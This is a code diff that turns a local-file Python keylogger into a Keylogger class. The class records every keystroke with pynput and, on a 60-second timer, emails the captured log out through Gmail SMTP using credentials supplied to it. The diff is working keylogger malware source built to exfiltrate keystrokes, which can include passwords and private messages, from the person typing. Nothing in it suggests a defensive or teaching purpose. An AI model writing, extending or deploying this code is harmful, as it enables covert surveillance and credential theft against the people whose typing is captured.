@@ -1,50 +1,69 @@
 #!/usr/bin/env python3
 
 from pynput import keyboard
-import signal
-
-file = open("log/log_file.txt", "w")
-
-'''
-Function called for signal management
-'''
-def exit_manage(signum, stack):
-    #Closing the file on which keyboard input is written
-    #otherwise file will stay empty
-    file.close()
-
+import threading
+import smtplib 
 
 '''
-Function for evaluation of input keys
+Send an email with log results of key logging
 '''
-def get_key(key):
-    if isinstance(key, keyboard.KeyCode):
-        return key.char
-    else:
-        return str(key)
-
-'''
-Callback called by listener in 
-'''
-def press(key):
-    #Obtain string of key inserted
-    key_name = get_key(key)
-
-    #Write key typed in the file
-    file.write('Message: {}\n'.format(key_name))
+def send_mail(email, password, msg):
+    server = smtplib.SMTP("smtp.gmail.com", 587)
+    server.starttls()
+    server.login(email, password)
+    server.sendmail(email, email, msg)
+    server.quit()
 
 
 '''
-Main function
+Keylogger class
 '''
-def main():
-    #Set exit_manage() as callback for SIGUSR1
-    signal.signal(signal.SIGUSR1, exit_manage)
+class Keylogger:
+    '''
+    Constructor
+    '''
+    def __init__(self, email, password, refresh_time=60):
+        self.log = ''
+        self.email = email #Gmail address
+        self.password = password #Password of the mail
+        self.refresh_time = refresh_time #DEFAULT: 60s=1m
 
-    #Listener for keyboard input
-    with keyboard.Listener(on_press=press) as listener:
-        listener.join()
+    '''
+    Callback called by listener in 
+    '''
+    def press_key(self, key):
+        #Obtain string of key inserted
+        try:
+            key_string = str(key.char)
+        except AttributeError:
+            #Special key pressed
+            if key == key.space: 
+                #Otherwise printed 'key space'
+                key_string = " "
+            else:
+                key_string = " " + str(key) + " "
+        
+        self.log += key_string
 
+    '''
+    Function executed by thread that periodicaly sends logged keys
+    '''
+    def report(self):
+        #Send mail with obtained log
+        send_mail(self.email, self.password, self.log)
+        self.log = ''
+        
+        #Timer run in parallel every self.refresh_time seconds
+        timer = threading.Timer(self.refresh_time, self.report)
+        timer.start()
 
-if __name__=='__main__':
-    main()
+    '''
+    Main function
+    '''
+    def start(self):
+        #Listener for keyboard input working in parallel with timer for printing
+        with keyboard.Listener(on_press=self.press_key) as listener:
+            #Send info
+            self.report()
+            #Manage keyboard input
+            listener.join()
